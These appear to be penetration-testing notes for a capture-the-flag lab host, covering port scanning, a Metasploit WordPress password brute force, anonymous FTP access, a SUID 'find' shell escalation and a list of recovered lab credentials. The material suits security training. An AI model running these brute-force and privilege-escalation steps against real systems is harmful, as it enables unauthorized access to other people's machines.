>**IP Address: 10.10.110.100**

```bash
nmap -T5 -p- 10.10.110.100
```

![[box1Ports.png]]

```bash
sudo nmap -sV -sC -oA box1.tcp -v -p 21,22,65000 10.10.110.100
```

![[box1FullNmap.png]]

>FTP Anonymous login is allowed

>Port 65000 is an http port and has a disallowed entry in robots.txt "/wordpress & DANTE{Y0u_Cant_G3t_at_m3_br0!}"

### HTTP Port 65000

![[Pasted image 20240729111753.png]]

#### Wordpress Site

![[Pasted image 20240729111911.png]]

![[Pasted image 20240729112223.png]]

![[Pasted image 20240729112010.png]]

![[Pasted image 20240729112024.png]]

![[Pasted image 20240729112038.png]]

![[Pasted image 20240729112047.png]]

![[Pasted image 20240729112054.png]]

![[Pasted image 20240729112148.png]]

![[Pasted image 20240729112201.png]]

![[Pasted image 20240729112209.png]]

![[Pasted image 20240729113937.png]]

![[Pasted image 20240729113950.png]]

```bash
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > wordlist
```

```bash
msfconsole
use scanner/http/wordpress_login_enum
set rhosts 10.10.110.100
set rport 65000
set username james
set pass_file wordlist
set targeturi /wordpress
run
```

>/wordpress - WordPress Brute Force - SUCCESSFUL login for 'james' : 'Toyota'

### FTP Port

```bash
ftp anonymous@10.10.110.100
passive
dir
cd Transfer
dir
cd Incoming
dir
get todo.txt
```

![[Pasted image 20240729113444.png]]

![[Pasted image 20240729113621.png]]


### Priv Esc

SUID is set on the find binary

```bash
find . -exec /bin/sh -p \; -quit
```
### Creds

james:Toyota
balthazar:TheJoker12345!
root = rootKey